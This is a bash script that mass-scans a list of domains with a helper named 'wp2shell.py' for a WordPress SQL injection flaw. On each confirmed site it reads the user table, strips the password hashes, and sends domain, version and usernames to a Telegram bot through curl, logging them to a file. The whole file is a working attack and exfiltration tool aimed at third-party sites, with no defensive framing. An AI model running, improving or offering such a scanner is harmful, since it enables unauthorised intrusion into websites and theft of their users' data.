#!/usr/bin/env bash
# batch-scan.sh — check domains, read users on confirmed vulns, send to Telegram

set -u

WORKERS="${2:-5}"
RESULTS_DIR="$(dirname "$0")/results"
SCRIPT_DIR="$(dirname "$0")"
mkdir -p "$RESULTS_DIR"

TG_TOKEN="${TG_TOKEN:-}"
TG_CHAT_ID="${TG_CHAT_ID:-}"

tg_send() {
  [[ -z "$TG_TOKEN" || -z "$TG_CHAT_ID" ]] && return
  for chat_id in $TG_CHAT_ID; do
    curl -s -X POST "https://api.telegram.org/bot${TG_TOKEN}/sendMessage" \
      -d chat_id="$chat_id" \
      -d text="$1" \
      -d parse_mode="HTML" > /dev/null 2>&1
  done
}

check_and_read() {
  local domain="$1"
  local check_result

  # Step 1: Check if vulnerable
  check_result=$(python3 "$SCRIPT_DIR/wp2shell.py" check "https://$domain" 2>&1)

  if ! echo "$check_result" | grep -q "CONFIRMED\|VULNERABLE"; then
    echo "⚪ $domain — not vulnerable"
    echo "$domain | NOT VULNERABLE" >> "$RESULTS_DIR/not-vuln.txt"
    return
  fi

  echo "🔴 $domain — CONFIRMED VULNERABLE"

  # Step 2: Read users (without password hash — too slow)
  local users_result
  users_result=$(timeout 300 python3 "$SCRIPT_DIR/wp2shell.py" read "https://$domain" --preset users 2>&1)

  # Extract user lines, remove password hash column
  local users_clean
  users_clean=$(echo "$users_result" | grep -E '^\s+[0-9]+\|' | sed 's/|\$P\$[^|]*//g' | sed 's/|\$2y\$[^|]*//g' | sed 's/|\$wp\$[^|]*//g')

  # Build telegram message
  local msg
  msg="🔴 <b>VULNERABLE</b> — <code>$domain</code>

<b>WP Version:</b> $(echo "$check_result" | grep -oE '[0-9]+\.[0-9]+\.[0-9]+' | head -1)
<b>Batch Endpoint:</b> $(echo "$check_result" | grep -oE 'HTTP [0-9]+' | head -1)
<b>Route Confusion:</b> $(echo "$check_result" | grep -q "ACTIVE" && echo "YES" || echo "NO")
<b>SQLi:</b> $(echo "$check_result" | grep -q "CONFIRMED" && echo "CONFIRMED" || echo "NO")

<b>Users:</b>
<pre>$users_clean</pre>"

  # Send to Telegram
  tg_send "$msg"

  # Save to file
  echo "$domain | VULNERABLE | $users_clean" >> "$RESULTS_DIR/confirmed.txt"
}

export -f check_and_read
export -f tg_send
export SCRIPT_DIR RESULTS_DIR TG_TOKEN TG_CHAT_ID

if [[ $# -lt 1 ]]; then
  echo "Usage: $0 domains.txt [workers]"
  exit 1
fi

echo "[*] Scanning with $WORKERS parallel workers..."
echo "[*] Results will be sent to Telegram"

cat "$1" | xargs -P "$WORKERS" -I {} bash -c 'check_and_read "$@"' _ {}

echo "[+] Done. Results in $RESULTS_DIR/"
